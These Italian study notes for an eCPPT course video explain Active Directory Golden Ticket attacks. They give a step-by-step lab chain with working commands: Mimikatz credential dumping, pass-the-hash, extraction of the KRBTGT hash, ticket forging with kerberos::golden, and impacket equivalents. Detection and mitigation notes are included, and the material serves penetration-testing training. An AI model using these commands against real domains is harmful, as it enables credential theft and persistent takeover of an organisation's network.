# 014 — AD Persistence: Golden Ticket (Active Directory Penetration Testing)

> **Modulo:** Active Directory Penetration Testing · **Video:** 14/15
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [014_AD Persistence_ Golden Ticket.txt](014_AD Persistence_ Golden Ticket.txt) · [014_AD Persistence_ Golden Ticket.srt](014_AD Persistence_ Golden Ticket.srt)

## Concetti chiave

- **Golden Ticket** = **TGT forgiato** cifrato con l'**NTLM hash dell'account `KRBTGT`**.
- Chi possiede l'hash di KRBTGT può forgiare un TGT per **qualsiasi utente, con qualsiasi gruppo, con qualsiasi validità** (default Mimikatz: 10 anni).
- È la forma più potente di **persistence** in AD: sopravvive a cambi password utente, ai reset, alle revocazioni. Si neutralizza solo **resettando KRBTGT due volte**.
- Prerequisito: **NTLM hash di KRBTGT** + **SID del dominio**.
- Workflow del lab: dump NTLM Administrator → PtH → DCSync via `lsadump::lsa /patch` per ottenere hash KRBTGT → forgia con `kerberos::golden /ptt` → accesso al DC.
- **Pitfall del video**: Alexis sbaglia il primo tentativo passando il **SID dell'admin** invece del **SID del dominio**. Correzione: `klist purge` e rigenerare con il SID corretto.

## Spiegazione approfondita

### Cos'è un Golden Ticket
Il TGT in Kerberos è cifrato e firmato con la **long-term key dell'account `KRBTGT`** (vedi video 04). Il KDC non controlla nulla del TGT oltre la sua firma: se la firma è valida, il TGT è valido e il PAC al suo interno è verità assoluta. Conoscere la key di KRBTGT = potere di **scrivere** un TGT da zero con:
- qualunque **username** (anche utenti inesistenti).
- qualunque **gruppo** (es. RID 512 = Domain Admins, 519 = Enterprise Admins).
- qualunque **lifetime** (default Mimikatz = 10 anni).

Una volta iniettato (PtT del TGT forgiato), si possono richiedere TGS per qualunque servizio del dominio e ottenere accesso totale.

### Perché "persistence"
- Resettare la password di un singolo utente non invalida il TGT (era già firmato).
- Il TGT è valido per anni.
- L'**unico** modo per invalidarli è ruotare la password di KRBTGT **due volte** (perché AD mantiene la vecchia chiave per gestire ticket in flight).

### Differenza Golden vs Silver Ticket
| Aspetto | Golden Ticket | Silver Ticket |
|---|---|---|
| Ticket forgiato | **TGT** | **TGS** |
| Chiave necessaria | NTLM hash di **KRBTGT** | NTLM hash dell'**account del servizio** (computer/service) |
| Scope | **Intero dominio** (forest se enterprise) | **Un singolo servizio su un host** |
| Coinvolge KDC? | Sì (presentato al KDC per ottenere TGS) | **No** (presentato direttamente al servizio) |
| Detection | Più alto (passa dal DC) | Più bassa (skippa il DC) |
| Persistence value | Massimo | Limitato per scope |

### Scenario del lab — Chain completa
```
[student@client elevated]
  └─ Mimikatz: sekurlsa::logonpasswords
       └─ Dump NTLM hash Administrator + SID dell'admin
            └─ sekurlsa::pth /user:Administrator /domain /ntlm:<hash>
                 └─ Nuovo cmd come Administrator (DA)
                      └─ lsadump::lsa /patch /computer:<DC>      (DCSync-like)
                           └─ Dump NTLM hash di KRBTGT
                                └─ kerberos::golden /user:Administrator
                                                    /domain:research.security.local
                                                    /sid:<DOMAIN_SID>
                                                    /krbtgt:<KRBTGT_HASH>
                                                    /id:500 /groups:512
                                                    /startoffset:0 /endin:600 /renewmax:10080
                                                    /ptt
                                     └─ klist (verifica iniezione TGT forgiato)
                                          └─ dir \\prod.research.security.local\C$  ✓
```

### Step-by-step
1. **Verifica baseline** — l'attaccante non ha accesso al DC:
   ```powershell
   dir \\prod.research.security.local\C$    # Access Denied
   ```
2. **Setup**: PowerShell as Admin, carica Mimikatz/PowerView (tools `C:\Tools\`).
3. **Dump NTLM Administrator**:
   ```powershell
   Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
   ```
   Annota: SID dell'Administrator (per debug, NON è quello che serve per il golden!), NTLM hash dell'Administrator.
4. **Pass-the-Hash come Administrator** (per avere i privilegi necessari a fare DCSync):
   ```powershell
   Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:research.security.local /ntlm:<NTLM_HASH>"'
   ```
   Spawn di un cmd con identità Administrator.
5. **Dal nuovo cmd, dump KRBTGT** via `lsadump::lsa /patch`:
   ```cmd
   powershell -ep bypass
   . .\Invoke-Mimikatz.ps1
   Invoke-Mimikatz -Command '"lsadump::lsa /patch /computer:prod.research.security.local"'
   ```
   Output: hash NTLM dell'account `krbtgt`. **Conservare**.
6. **Forgia del Golden Ticket** (con il **SID del DOMINIO**, NON dell'admin!):
   ```powershell
   Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:research.security.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
   ```
7. **Verifica** con `klist` → TGT per `Administrator@research.security.local`.
8. **Accesso al DC**:
   ```powershell
   dir \\prod.research.security.local\C$    # ✓ ora funziona
   ```

### Parametri di `kerberos::golden` da memorizzare
| Param | Valore | Significato |
|---|---|---|
| `/user` | Qualunque (anche fittizio) | Username da impersonare |
| `/domain` | FQDN | Dominio target |
| `/sid` | **SID del dominio** | Senza il `-RID` finale. Errore tipico: passare il SID di un utente |
| `/krbtgt` | NTLM hash di krbtgt | La chiave maestra |
| `/id` | 500 | RID utente (500 = Administrator) |
| `/groups` | 513,512,520,518,519 (default) | RID gruppi nel PAC (512=Domain Admins, 519=Enterprise Admins) |
| `/startoffset` | 0 | Inizio validità (minuti, offset da ora) |
| `/endin` | 600 (10 anni di default reale) | Durata in minuti |
| `/renewmax` | 10080 (7 giorni in min) | Max renew |
| `/ptt` | flag | Inietta direttamente in memoria (Pass-the-Ticket implicito) |

### L'errore del video (lesson learned)
Alexis nel primo tentativo passa come `/sid` il SID **dell'account Administrator** (che termina in `-500`). Risultato: il ticket si forgia ma il KDC lo rifiuta → "Access denied" sui share del DC. Soluzione: `klist purge` (rimuove i ticket cached), rigenerazione con il **SID del dominio** (senza il `-500` finale). Punto utile da ricordare per i lab eCPPT.

## Comandi & strumenti

| Comando | Scopo | Note |
|---|---|---|
| `Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'` | Dump credenziali in LSASS | Step iniziale per ottenere DA |
| `Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:<d> /ntlm:<h>"'` | PtH per spawn process come DA | Vedi video 012 |
| `Invoke-Mimikatz -Command '"lsadump::lsa /patch /computer:<DC>"'` | Dump hash KRBTGT (e altri secrets) via DCSync-like | Richiede DA o DCSync rights |
| `Invoke-Mimikatz -Command '"kerberos::golden ..."'` | Forgia + inject TGT | Vedi tabella parametri sopra |
| `klist` | Lista ticket cached | Verifica inject |
| `klist purge` | Cancella ticket cached | Necessario dopo errore di forgia |
| `dir \\<DC>\C$` | Test accesso SMB al DC | Verifica successo |

## Esempi pratici

```powershell
# === Setup ===
powershell -ep bypass        # da PowerShell as Administrator
cd C:\Tools
. .\PowerView.ps1
. .\Invoke-Mimikatz.ps1

# === 0. Baseline: nessun accesso ===
dir \\prod.research.security.local\C$
# Access is denied.

# === 1. Dump credenziali ===
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
# Annota:
#   Administrator NTLM: <ADMIN_NT>
#   Domain SID:         <DOMAIN_SID>   (es. S-1-5-21-xxxx-yyyy-zzzz)

# === 2. PtH come Administrator ===
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:research.security.local /ntlm:<ADMIN_NT>"'
# Si apre cmd impersonato

# === 3. Da quel cmd, dump KRBTGT via DCSync-like ===
powershell -ep bypass
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::lsa /patch /computer:prod.research.security.local"'
# Annota:
#   krbtgt NTLM: <KRBTGT_NT>

# === 4. Golden Ticket ===
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:research.security.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NT> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# === 5. Verifica ===
klist
dir \\prod.research.security.local\C$   # ✓

# === In caso di errore SID, prima di rigenerare ===
klist purge
# poi rilancia kerberos::golden con il SID corretto
```

```bash
# Alternativa cross-platform con impacket
# 1. DCSync per ottenere krbtgt
impacket-secretsdump research.security.local/Administrator@<DC_IP> -hashes :<ADMIN_NT> -just-dc-user krbtgt

# 2. Forgia ticket
impacket-ticketer -nthash <KRBTGT_NT> -domain-sid <DOMAIN_SID> -domain research.security.local Administrator

# 3. Uso
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass research.security.local/Administrator@prod.research.security.local
```

## Punti d'attenzione per l'esame eCPPT

- **Chiave necessaria**: NTLM hash dell'account **`KRBTGT`**. Senza quello = niente Golden.
- Per ottenere l'hash di KRBTGT serve essere **DA** (o avere **DCSync rights**: `DS-Replication-Get-Changes` + `...-Get-Changes-All`). Vedi BloodHound query "Find Principals with DCSync Rights".
- Il **SID** richiesto da `kerberos::golden /sid` è il **SID del DOMINIO** (no `-500`, no `-1103`, nessun RID utente). Errore frequente.
- **`/id:500 /groups:512`** = impersoni Administrator (RID 500) come membro di Domain Admins (RID 512). Si possono aggiungere 519 (Enterprise Admins), 518 (Schema Admins), 520 (Group Policy Creator Owners), 513 (Domain Users) per essere ancora più potenti.
- **`/ptt`** = inietta il ticket immediatamente nella sessione (no file `.kirbi` su disco).
- Mitigation: **double-reset di KRBTGT** (la doppia rotazione è necessaria perché AD mantiene la "previous key" attiva).
- **Differenza con Silver Ticket** (domanda quasi certa, vedi tabella sopra): Golden = TGT/KRBTGT/dominio intero; Silver = TGS/service account/servizio singolo.
- **Differenza con Pass-the-Ticket**: PtT riusa un ticket **legittimo rubato**; Golden Ticket è un ticket **forgiato da zero** (potenzialmente per user che nemmeno esistono).
- **Default Mimikatz**: il ticket forgiato è valido **10 anni** se non specifichi diversamente — flag tipico nelle detection.
- Il pattern `lsadump::lsa /patch` è la via per dumpare hash da remote computer (richiede admin sul DC; alternativa: `lsadump::dcsync /user:krbtgt`).
- Detection del Golden Ticket: ticket con encryption RC4 di default, lifetime anomalo, **assenza dell'AS-REQ corrispondente** (il TGT esiste senza essere mai stato richiesto al KDC).

## Collegamenti con altri video

- Precedente: [[013_AD Lateral Movement_ Pass-the-Ticket]]
- Prossimo: [[015_AD Persistence_ Silver Ticket]] — il fratello "stealth".
- Concetto di chiave KRBTGT: [[04_Active Directory Authentication]]
- DCSync rights identification: [[08_AD Enumeration_ BloodHound]]
- Per ottenere DA serve PtH/Kerberoasting/etc: [[011_Kerberoasting]] · [[012_AD Lateral Movement_ Pass-the-Hash]]
